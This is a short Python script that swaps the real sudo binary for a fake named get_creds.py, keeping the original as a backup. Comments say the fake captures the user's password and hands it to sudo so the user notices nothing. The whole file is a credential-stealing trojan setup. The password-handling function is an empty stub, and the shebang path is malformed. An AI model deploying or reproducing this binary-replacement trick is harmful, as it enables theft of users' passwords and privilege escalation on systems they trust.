#!/usr/env/python3
from shutil import move
#move sudo to a new location, replace with get-info(), 
#return new location of actual sudo binary
#pass in tuple of file locations, 
def move_file(src, dst):
    move(src, dst)
    return {'src':src, 'dst':dst}
# pass password to sudo so the  user can compelete their command
def pass_to_sudo():
    return
if __name__ == '__main__':
    fake_sudo = './get_creds.py'
    real_sudo = './usrbin/sudo'
    backup_sudo = './usrbin/baksudo'
    move(real_sudo, backup_sudo)
    move(fake_sudo, real_sudo)

